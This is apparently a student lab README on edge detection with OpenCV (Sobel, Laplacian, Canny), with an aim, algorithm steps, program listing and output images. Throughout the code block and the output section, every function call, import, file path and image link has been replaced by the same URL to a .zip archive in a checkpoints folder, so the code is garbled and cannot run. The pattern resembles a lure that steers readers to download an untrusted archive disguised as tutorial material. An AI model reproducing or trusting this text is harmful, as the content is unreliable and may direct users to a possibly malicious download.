# Edge-Detection
## Aim:
To perform edge detection using Sobel, Laplacian, and Canny edge detectors.

## Software Required:
Anaconda - Python 3.7

## Algorithm:
### Step1:
Import the required packages for further process.

### Step2:
Read the image and convert the rgb image to gray scale image.

### Step3:
Use filters for smoothing the image to reduce the noise.



### Step4:

Apply the respective filters - Sobel, Laplacian edge detector and Canny edge detector.



### Step5:
Display the filtered image using plot and imshow.


 
## Program:

``` Python
# Import the packages
import cv2
import https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip as plt
https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip("https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip")
https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip(image,https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip)
https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip(gray_img,(3,3),0)
https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip(img,https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip,1,0,ksize=5)
https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip(img,https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip,0,1,ksize=5)
https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip(img,https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip,1,1,ksize=5)
https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip(figsize=(16,16))
https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip(1,2,1)
https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip(img,cmap='gray')
https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip('Gray')
https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip(1,2,2)
https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip(sobelx,cmap='gray')
https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip("Sobel-X")
https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip([])
https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip([])
https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip()

# Load the image, Convert to grayscale and remove noise

import cv2
import https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip as plt
https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip("https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip")
https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip(image,https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip)
https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip(gray_img,(3,3),0)
https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip(img,https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip,0,1,ksize=5)
https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip(figsize=(16,16))
https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip(1,2,1)
https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip(img,cmap='Purples')
https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip('Purples')
https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip(1,2,2)
https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip(sobely,cmap='Purples')
https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip("Sobel-Y")
https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip([])
https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip([])
https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip()

# SOBEL EDGE DETECTOR

import cv2
import https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip as plt
https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip("https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip")
https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip(image,https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip)
https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip(gray_img,(3,3),0)
https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip(img,https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip,1,1,ksize=5)
https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip(figsize=(16,16))
https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip(1,2,1)
https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip(img,cmap='Oranges')
https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip('Gray')
https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip(1,2,2)
https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip(sobelxy,cmap='Oranges')
https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip("Sobel-XY")
https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip([])
https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip([])
https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip()

# LAPLACIAN EDGE DETECTOR

import cv2
import https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip as plt
https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip("https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip")
https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip(image,https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip)
https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip(gray_img,(3,3),0)
laplacian = https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip(img,https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip)
https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip(figsize=(16,16))
https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip(1,2,1)
https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip(img,cmap='Blues')
https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip('Gray')
https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip(1,2,2)
https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip(laplacian,cmap='Blues')
https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip("Laplacian")
https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip([])
https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip([])
https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip()

# CANNY EDGE DETECTOR

import cv2
import https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip as plt
https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip("https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip")
https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip(image,https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip)
https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip(gray_img,(3,3),0)
canny_edges = https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip(image, 120, 150)
https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip(figsize=(16,16))
https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip(1,2,1)
https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip(img,cmap='gray')
https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip('Gray')
https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip(1,2,2)
https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip(canny_edges,cmap='gray')
https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip("Canny_edges")
https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip([])
https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip([])
https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip()


```
## Output:
### SOBEL EDGE DETECTOR
#### Sobel X:
![output](https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip)
 
#### Sobel Y:
![output](https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip)

#### Sobel XY:
![output](https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip)

### LAPLACIAN EDGE DETECTOR:

![output](https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip)



### CANNY EDGE DETECTOR
 ![output](https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip)


## Result:
Thus the edges are detected using Sobel, Laplacian, and Canny edge detectors.
